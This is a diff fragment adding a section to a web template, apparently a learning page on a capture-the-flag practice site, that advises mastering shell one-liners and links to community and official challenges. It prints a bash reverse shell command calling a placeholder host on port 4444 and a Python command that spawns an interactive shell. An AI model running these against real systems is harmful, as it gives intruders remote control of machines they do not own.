+        <div class="k-step-num"><i class="fas fa-terminal" style="font-size:.7rem;"></i></div>
+        <div class="k-step-body">
+          <div class="k-step-title">Learn One-Liners</div>
+          <div class="k-step-desc">Master common reverse shells and enumeration one-liners. Keep a cheatsheet handy:<br><code>bash -i &gt;&amp; /dev/tcp/YOURIP/4444 0&gt;&amp;1</code><br><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="k-tip">
+      <i class="fas fa-graduation-cap"></i>
+      <div class="k-tip-text"><strong>Want to practice?</strong> Head to the <a href="/community" style="color:var(--k-accent);font-weight:600;">Community Challenges</a> section to try challenges created by other members, or visit <a href="/challenges" style="color:var(--k-accent);font-weight:600;">Challenges</a> to attempt the official ones!</div>
+    </div>
+  </section>
+
+</div>
+{% endblock %}
